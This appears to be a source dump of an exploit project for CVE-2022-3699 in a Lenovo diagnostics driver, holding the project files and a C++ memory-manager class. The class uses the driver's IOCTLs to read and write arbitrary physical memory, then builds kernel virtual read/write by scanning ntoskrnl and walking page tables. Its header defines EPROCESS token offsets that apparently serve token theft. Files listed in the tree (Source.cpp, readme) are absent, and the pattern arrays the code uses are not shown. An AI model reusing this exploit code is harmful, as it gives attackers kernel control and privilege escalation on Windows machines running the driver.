Project Path: arc_gmh5225_CVE-2022-3699_g2m5co4x

Source Tree:

```txt
arc_gmh5225_CVE-2022-3699_g2m5co4x
├── CVE-2022-3699
│   ├── CVE-2022-3699.vcxproj
│   ├── CVE-2022-3699.vcxproj.filters
│   ├── LenovoMemoryMgr.cpp
│   ├── LenovoMemoryMgr.h
│   └── Source.cpp
├── CVE-2022-3699.sln
├── LenovoDiagnosticsDriver.sys
└── readme.md

```

`CVE-2022-3699.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio Version 16
VisualStudioVersion = 16.0.30804.86
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "CVE-2022-3699", "CVE-2022-3699\CVE-2022-3699.vcxproj", "{BF4447B0-1F74-4375-B7A7-187F9F86E868}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|x64 = Debug|x64
		Debug|x86 = Debug|x86
		Release|x64 = Release|x64
		Release|x86 = Release|x86
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{BF4447B0-1F74-4375-B7A7-187F9F86E868}.Debug|x64.ActiveCfg = Debug|x64
		{BF4447B0-1F74-4375-B7A7-187F9F86E868}.Debug|x64.Build.0 = Debug|x64
		{BF4447B0-1F74-4375-B7A7-187F9F86E868}.Debug|x86.ActiveCfg = Debug|Win32
		{BF4447B0-1F74-4375-B7A7-187F9F86E868}.Debug|x86.Build.0 = Debug|Win32
		{BF4447B0-1F74-4375-B7A7-187F9F86E868}.Release|x64.ActiveCfg = Release|x64
		{BF4447B0-1F74-4375-B7A7-187F9F86E868}.Release|x64.Build.0 = Release|x64
		{BF4447B0-1F74-4375-B7A7-187F9F86E868}.Release|x86.ActiveCfg = Release|Win32
		{BF4447B0-1F74-4375-B7A7-187F9F86E868}.Release|x86.Build.0 = Release|Win32
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {CE6FEA7C-6E30-49DC-A8A0-2D9CD13FDB9F}
	EndGlobalSection
EndGlobal

```

`CVE-2022-3699/CVE-2022-3699.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>16.0</VCProjectVersion>
    <Keyword>Win32Proj</Keyword>
    <ProjectGuid>{bf4447b0-1f74-4375-b7a7-187f9f86e868}</ProjectGuid>
    <RootNamespace>CVE20223699</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="LenovoMemoryMgr.cpp" />
    <ClCompile Include="Source.cpp" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="LenovoMemoryMgr.h" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`CVE-2022-3699/CVE-2022-3699.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="LenovoMemoryMgr.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="Source.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="LenovoMemoryMgr.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
</Project>
```

`CVE-2022-3699/LenovoMemoryMgr.cpp`:

```cpp
/*
Copyright 2022 <COPYRIGHT HOLDER>

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
*/

#include "LenovoMemoryMgr.h"

template <typename T>
BOOL LenovoMemoryMgr::ReadPhysData(UINT64 address, T* data)
{
    if (!data) {
        return FALSE;
    }

	switch (sizeof(T))
	{
	case 1:
	case 2:
	case 4:
	case 8:
		break;
	default:
		return FALSE;
	}

	LDIAG_READ lr = { 0 };
	BOOL bStatus = FALSE;
	DWORD dwBytesReturned = 0;
	DWORD64 outbuffer = 0;

	lr.data = address;
	lr.wLen = sizeof(DWORD64);

	bStatus = DeviceIoControl(
		this->hDevice,
		IOCTL_PHYS_RD,
		&lr,
		sizeof(LDIAG_READ),
		&outbuffer,
		sizeof(DWORD64),
		&dwBytesReturned,
		NULL
	);

	if (!bStatus) {
		return FALSE;
	}

	*data = (T)outbuffer;
    return TRUE;
}

template<typename T>
BOOL LenovoMemoryMgr::WritePhysData(_In_ UINT64 PhysDest, _In_ T* data)
{

	//printf("WritePhysData entered\n\tPhysDest %llx\n\tData %p\n\tsizeof(Data) %llx\n", PhysDest, data, sizeof(T));
	if (!data && !PhysDest) {
		return FALSE;
	}

	switch (sizeof(T))
	{
	case 1:
	case 2:
	case 4:
	case 8:
		break;
	default:
		return FALSE;
	}

	NTSTATUS status = 0;
	BOOL bRes = FALSE;
	LDIAG_WRITE lw = { 0 };
	DWORD dwBytesReturned = 0;

	lw._where = PhysDest;
	lw._what_ptr = (DWORD64)data;
	lw.dwMapSize = (DWORD)sizeof(T);
	lw.dwLo = 0x6C61696E;

	status = DeviceIoControl(
		this->hDevice,
		IOCTL_PHYS_WR,
		&lw,
		sizeof(LDIAG_WRITE),
		NULL,
		0,
		&dwBytesReturned,
		NULL
	);

	return NT_SUCCESS(status);
}

template<typename T>
BOOL LenovoMemoryMgr::ReadVirtData(UINT64 address, T* data)
{

	//printf("Reading %zd bytes from %llx\n", sizeof(T), address);

	if (!data) {
		return FALSE;
	}

	switch (sizeof(T))
	{
	case 1:
	case 2:
	case 4:
	case 8:
		break;
	default:
		return FALSE;
	}

	if (!this->WritePhysData(this->physSwapAddr, (T*)address)) {
		return FALSE;
	}

	return this->ReadPhysData(this->physSwapAddr, data);
}

template<typename T>
BOOL LenovoMemoryMgr::WriteVirtData(UINT64 address, T* data)
{
	if (!data) {
		return FALSE;
	}

	switch (sizeof(T))
	{
	case 1:
	case 2:
	case 4:
	case 8:
		break;
	default:
		return FALSE;
	}

	PAGE_TABLE_ENTRY pte = { 0 };
	PFILL_PTE_HIERARCHY PteHierarchy = this->CreatePteHierarchy(address);

	PageType pt = this->GetPageTypeForVirtualAddress(address, &pte);
	UINT64 PhysAddr = this->VtoP(address, pte.flags.Pfn, pt);

	return this->WritePhysData(PhysAddr, data);
}

// https://github.com/ch3rn0byl/CVE-2021-21551/blob/master/CVE-2021-21551/DellBiosUtil.cpp
PFILL_PTE_HIERARCHY LenovoMemoryMgr::CreatePteHierarchy(UINT64 VirtualAddress)
{
	PFILL_PTE_HIERARCHY retval = new FILL_PTE_HIERARCHY;

	///
	/// Resolve the PTE address
	/// 
	VirtualAddress >>= 9;
	VirtualAddress &= 0x7FFFFFFFF8;
	VirtualAddress += this->PteBase;

	retval->PTE = VirtualAddress;

	///
	/// Resolve the PDE address
	/// 
	VirtualAddress >>= 9;
	VirtualAddress &= 0x7FFFFFFFF8;
	VirtualAddress += this->PteBase;

	retval->PDE = VirtualAddress;

	///
	/// Resolve the PPE address
	/// 
	VirtualAddress >>= 9;
	VirtualAddress &= 0x7FFFFFFFF8;
	VirtualAddress += this->PteBase;

	retval->PPE = VirtualAddress;

	///
	/// Resolve the PXE address
	/// 
	VirtualAddress >>= 9;
	VirtualAddress &= 0x7FFFFFFFF8;
	VirtualAddress += this->PteBase;

	retval->PXE = VirtualAddress;

	return retval;
}

UINT64 LenovoMemoryMgr::FindPhysSwapSpace()
{
	UINT64 begin = 0x1000;
	UINT64 end = 0x10000;
	BOOL bRes = FALSE;
	UINT64 val = 0;
	while (begin < end) {
		bRes = this->ReadPhysData<UINT64>(begin, &val);
		if (!bRes) {
			return NULL;
		}

		if (!val) {
			return begin;
		}

		begin += 8;
	}
	return NULL;
}

UINT64 LenovoMemoryMgr::GetPteBase()
{
	DWORD64 read_src = 0;
	DWORD64 call_loc = 0;
	DWORD64 sz_found_item = 0;
	LPVOID lpMiGetPhysicalAddress = NULL;
	LPVOID lpMiFillPteHierarchy = NULL;
	DWORD64 lpMmPteBase = NULL;

	HMODULE hNtos = LoadLibraryA("ntoskrnl.exe");
	LONG dwRel32Loc = 0;
	WORD wNopRet = 0;
	BOOL bRes = FALSE;
	BYTE firstByte = 0;

	if (!hNtos) {
		return FALSE;
	}

	PVOID lpMmGetPhysicalAddress = GetProcAddress(hNtos, "MmGetPhysicalAddress");

	if (!lpMmGetPhysicalAddress) {
		puts("Finding MmGetPhysicalAddress failed");
		return FALSE;
	}

	lpMmGetPhysicalAddress = (PVOID)(((SIZE_T)lpMmGetPhysicalAddress - (SIZE_T)hNtos) + (SIZE_T)this->NtosBase);
	FreeLibrary(hNtos);

	puts("Searching MmGetPhysicalAddress for MiGetPhysicalAddress...");

	read_src = (SIZE_T)lpMmGetPhysicalAddress;

	bRes = this->SearchPattern(
		(PBYTE)&arrMmGetPhysPattern,
		(PBYTE)&arrMmGetPhysMask,
		sizeof(arrMmGetPhysMask),
		(UINT64)lpMmGetPhysicalAddress,
		MAXSEARCH_MMGETPHYS,
		(PUINT64)&lpMiGetPhysicalAddress
	);
	if (!bRes) {
		return FALSE;
	}

	printf("Found MiGetPhysicalAddress call at %llx\n", (SIZE_T)lpMiGetPhysicalAddress);
	puts("reading offset from call instruction");

	bRes = this->ReadVirtData(((SIZE_T)lpMiGetPhysicalAddress + 1), (PDWORD)&dwRel32Loc);
	if (!bRes) {
		return FALSE;
	}

	lpMiGetPhysicalAddress = (PVOID)((SIZE_T)lpMiGetPhysicalAddress + SZ_CALLREL32 + dwRel32Loc);
	printf("MiGetPhysicalAddress at %llx\n", (SIZE_T)lpMiGetPhysicalAddress);
	puts("Searching MiGetPhysicalAddress for MiFillPteHierarchy...");
	bRes = SearchPattern(
		(PBYTE)&arrCallMiFillPteHierarchy,
		(PBYTE)&arrCallMiFillPteHierarchyMask,
		sizeof(arrCallMiFillPteHierarchy),
		(UINT64)lpMiGetPhysicalAddress,
		MAXSEARCH_MIGETPHYS,
		(PUINT64)&lpMiFillPteHierarchy
	);

	if (!bRes) {
		//puts("Failure in finding MiFillPteHierarchy call...");
		return FALSE;
	}

	printf("Found MiFillPteHierarchy call at %llx\n", (SIZE_T)lpMiFillPteHierarchy);
	puts("reading offset from call instruction");
	dwRel32Loc = 0;
	bRes = this->ReadVirtData<DWORD>(((SIZE_T)lpMiFillPteHierarchy + 1), (PDWORD)&dwRel32Loc);
	if (!bRes) {
		return FALSE;
	}

	printf("offset is %x\n", dwRel32Loc);
	lpMiFillPteHierarchy = (PVOID)((SIZE_T)lpMiFillPteHierarchy + SZ_CALLREL32 + dwRel32Loc);
	printf("MiFillPteHierarchy at %llx\n", (SIZE_T)lpMiFillPteHierarchy);
	puts("Searching MiFillPteHierarchy for PteBase...");
	UINT64 qwPteBase = 0;

	bRes = SearchPattern(
		arrMiFillPteHeirarchyPTE,
		arrMiFillPteHeirarchyPTEMask,
		sizeof(arrMiFillPteHeirarchyPTEMask),
		(UINT64)lpMiFillPteHierarchy,
		MAXSEARCH_MIGETPHYS,
		(PUINT64)&qwPteBase
	);
	
	if (!bRes) {
		return FALSE;
	}

	bRes = this->ReadVirtData<UINT64>((qwPteBase + 2), &qwPteBase);
	if (!bRes) {
		return FALSE;
	}

	printf("PteBase is %llx\n", qwPteBase);
	return qwPteBase;
}

UINT64 LenovoMemoryMgr::VtoP(UINT64 va, UINT64 index, PageType p)
{
	switch (p) {
	case PageType::UsePte:
		va &= 0xfff;
		break;
	case PageType::UsePde:
		va &= 0x1fffff;
		break;
	default:
		return 0;
	}
	return (index << 12) + va;
}

BOOL LenovoMemoryMgr::SearchPattern(PBYTE pattern, PBYTE mask, DWORD dwPatternSize, UINT64 lpBeginSearch, SIZE_T lenSearch, PUINT64 AddressOfPattern)
{
	SIZE_T szBeginSearch = (SIZE_T)lpBeginSearch;
	BOOL bRes = FALSE;
	BOOL bFound = FALSE;
	for (int i = 0; i < lenSearch; i++) {
		for (unsigned int j = 0; j <= dwPatternSize; j++) {
			// read a byte
			BYTE b = 0;
			if (!this->ReadVirtData<BYTE>((szBeginSearch + i + j), &b)) {
				return FALSE;
			}

			if (j == dwPatternSize) {
				if (bFound)
				{
					*AddressOfPattern = szBeginSearch + i;
					return TRUE;
				}
				return FALSE;
			}

			// skip over if mask says to ignore value or if the byte matches our pattern
			if (mask[j] == '?' || b == pattern[j]) {
				//printf("+");
				bFound = TRUE;
			}
			else {
				//printf("-\n");
				bFound = FALSE;
				break;
			}
		}


	}

	return FALSE;
}

PageType LenovoMemoryMgr::GetPageTypeForVirtualAddress(UINT64 VirtAddress, PPAGE_TABLE_ENTRY PageTableEntry)
{
	// fill the pte hierarchy for the virtual address
	PFILL_PTE_HIERARCHY hierarchy = this->CreatePteHierarchy(VirtAddress);
	
	// read the PTE contents, if they are zero we are using large pages
	// if the PDE is also zero, god help you
	this->ReadVirtData<UINT64>(hierarchy->PTE, &PageTableEntry->value);

	if (!PageTableEntry->value) {
		this->ReadVirtData<UINT64>(hierarchy->PDE, &PageTableEntry->value);
		return PageType::UsePde;
	}

	return PageType::UsePte;
}

UINT64 LenovoMemoryMgr::FindNtosBase()
{
	UINT64 retval = 0;
	HANDLE hHeap = GetProcessHeap();
	LPVOID lpHeapBuffer = HeapAlloc(hHeap, 0, 0x2000);
	DWORD dwBytesReturned = 0;

	if (!lpHeapBuffer) {
		return NULL;
	}

	NTSTATUS status = NtQuerySystemInformation(
		(SYSTEM_INFORMATION_CLASS)SYS_INFO_CLASS_MODULE_INFO,
		lpHeapBuffer,
		0x2000,
		&dwBytesReturned
	);

	// realloc and try again
	// todo: add switch case for status
	if (!NT_SUCCESS(status)) {
		HeapFree(hHeap, 0, lpHeapBuffer);
		lpHeapBuffer = HeapAlloc(hHeap, 0, dwBytesReturned);

		if (!lpHeapBuffer) {
			return NULL;
		}

		status = NtQuerySystemInformation(
			(SYSTEM_INFORMATION_CLASS)SYS_INFO_CLASS_MODULE_INFO,
			lpHeapBuffer,
			dwBytesReturned,
			&dwBytesReturned
		);

		if (!NT_SUCCESS(status)) {
			return NULL;
		}
	}

	PSYSTEM_MODULE_INFORMATION psm = (PSYSTEM_MODULE_INFORMATION)lpHeapBuffer;
	if (psm->ModulesCount > 0) {
		retval = (UINT64)psm->Modules[0].ImageBase;
		HeapFree(hHeap, 0, lpHeapBuffer);
		return retval;
	}

	return NULL;
}

/*
		Todo: ensure our reads aren't crossing a page boundary
*/
_Use_decl_annotations_
BOOL LenovoMemoryMgr::ReadVirtualMemory(UINT64 address, PVOID buffer, size_t szBuffer)
{
	if (!buffer) {
		return FALSE;
	}
	BOOL bRes = FALSE;
	UINT64 bufferIndex = (UINT64)buffer;

	while (TRUE) {
		if (szBuffer > sizeof(UINT64)) {
			
			szBuffer -= sizeof(UINT64);
			bRes = this->ReadVirtData(address, (PUINT64)bufferIndex);
			if (!bRes) {
				return FALSE;
			}
			bufferIndex += sizeof(UINT64);

		}
		else if (szBuffer > sizeof(UINT32)) {

			szBuffer -= sizeof(UINT32);
			bRes = this->ReadVirtData(address, (PUINT32)bufferIndex);
			if (!bRes) {
				return FALSE;
			}
			bufferIndex += sizeof(UINT32);

		}
		else if (szBuffer > sizeof(UINT16)) {

			szBuffer -= sizeof(UINT16);
			bRes = this->ReadVirtData(address, (PUINT16)bufferIndex);
			if (!bRes) {
				return FALSE;
			}
			bufferIndex += sizeof(UINT16);

		}
		else if (szBuffer >= sizeof(UINT8)) {

			szBuffer -= sizeof(UINT8);
			bRes = this->ReadVirtData(address, (PUINT8)bufferIndex);
			if (!bRes) {
				return FALSE;
			}
			bufferIndex += sizeof(UINT8);

		}
		else {
			break;
		}
	}	

	return TRUE;
}

/*
		Todo: ensure our writes aren't crossing a page boundary
*/
_Use_decl_annotations_
BOOL LenovoMemoryMgr::WriteVirtualMemory(UINT64 address, PVOID buffer, size_t szBuffer)
{
	if (!buffer) {
		return FALSE;
	}

	BOOL bRes = FALSE;
	UINT64 bufferIndex = (UINT64)buffer;

	while (TRUE) {
		if (szBuffer > sizeof(UINT64)) {

			szBuffer -= sizeof(UINT64);
			bRes = this->WriteVirtData(address, (PUINT64)bufferIndex);
			if (!bRes) {
				return FALSE;
			}
			bufferIndex += sizeof(UINT64);

		}
		else if (szBuffer > sizeof(UINT32)) {

			szBuffer -= sizeof(UINT32);
			bRes = this->WriteVirtData(address, (PUINT32)bufferIndex);
			if (!bRes) {
				return FALSE;
			}
			bufferIndex += sizeof(UINT32);

		}
		else if (szBuffer > sizeof(UINT16)) {

			szBuffer -= sizeof(UINT16);
			bRes = this->WriteVirtData(address, (PUINT16)bufferIndex);
			if (!bRes) {
				return FALSE;
			}
			bufferIndex += sizeof(UINT16);

		}
		else if (szBuffer >= sizeof(UINT8)) {

			szBuffer -= sizeof(UINT8);
			bRes = this->WriteVirtData(address, (PUINT8)bufferIndex);
			if (!bRes) {
				return FALSE;
			}
			bufferIndex += sizeof(UINT8);

		}
		else {
			break;
		}
	}

	return TRUE;
	
}

BOOL LenovoMemoryMgr::init()
{
    HANDLE hDev = CreateFileA(
        this->strDeviceName,
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hDev == NULL || hDev == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

	this->NtosBase = this->FindNtosBase();
    this->hDevice = hDev;
	this->physSwapAddr = this->FindPhysSwapSpace();
	this->PteBase = this->GetPteBase();
    return TRUE;
}

BOOL LenovoMemoryMgr::teardown()
{
    CloseHandle(this->hDevice);
    return 0;
}

```

`CVE-2022-3699/LenovoMemoryMgr.h`:

```h
/*
Copyright 2022 <COPYRIGHT HOLDER>

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
*/

#pragma once
#include <Windows.h>
#include <winternl.h>
#include <stdio.h>

#pragma comment(lib, "ntdll")

#define IOCTL_PHYS_RD 0x222010
#define IOCTL_PHYS_WR 0x222014

#define SYS_INFO_CLASS_MODULE_INFO 0x0b
#define OFFSET_PS_INITIAL_SYSTEM_PROC 0x00cfb420
#define EPROCESS_TOKEN_OFFSET 0x358
#define EPROCESS_ACTIVE_LINKS_OFFSET 
#define EPROCESS_DIRBASE_OFFSET 0x028

typedef struct SYSTEM_MODULE {
	PVOID  Reserved1;
	PVOID  Reserved2;
	PVOID  ImageBase;
	ULONG  ImageSize;
	ULONG  Flags;
	USHORT Index;
	USHORT NameLength;
	USHORT LoadCount;
	USHORT PathLength;
	CHAR   ImageName[256];
} SYSTEM_MODULE, * PSYSTEM_MODULE;

typedef struct SYSTEM_MODULE_INFORMATION {
	ULONG                ModulesCount;
	SYSTEM_MODULE        Modules[1];
} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;

typedef struct LDIAG_READ {
	DWORD64 data;
	DWORD64 wLen;
} LDIAG_READ, * PLDIAG_READ;

typedef struct LDIAG_WRITE {
	DWORD64 _where;
	DWORD dwMapSize;
	DWORD dwLo;
	DWORD64 _what_ptr;
} LDIAG_WRITE, * PLDIAG_WRITE;

// https://github.com/ch3rn0byl/CVE-2021-21551/blob/master/CVE-2021-21551/typesndefs.h
typedef struct _FILL_PTE_HIERARCHY
{
	UINT64 PXE = 0;
	UINT64 PPE = 0;
	UINT64 PDE = 0;
	UINT64 PTE = 0;
} FILL_PTE_HIERARCHY, * PFILL_PTE_HIERARCHY;

// https://github.com/ch3rn0byl/CVE-2021-21551/blob/master/CVE-2021-21551/typesndefs.h#L54
typedef union _PAGE_TABLE_ENTRY
{
	struct
	{
		UINT64 Present : 1;					/// bit 0
		UINT64 ReadWrite : 1;				/// bit 1
		UINT64 UserSupervisor : 1;			/// bit 2
		UINT64 PageLevelWriteThrough : 1;	/// bit 3
		UINT64 PageLevelCacheDisable : 1;	/// bit 4
		UINT64 Accessed : 1;				/// bit 5
		UINT64 Dirty : 1;					/// bit 6
		UINT64 PAT : 1;						/// bit 7
		UINT64 Global : 1;					/// bit 8 
		UINT64 CopyOnWrite : 1;				/// bit 9
		UINT64 Ignored : 2;					/// bits 10 - 11
		UINT64 Pfn : 40;					/// bits 12 - (52 - 1)
		UINT64 Reserved : 11;				/// bits 52 - 62
		UINT64 NxE : 1;						/// bit 63
	} flags;
	UINT64 value = 0;
} PAGE_TABLE_ENTRY, * PPAGE_TABLE_ENTRY;

enum PageType {
	UsePte,
	UsePde
};

// Begin pattern matching
#define NOP_RET ((WORD)0xc390)
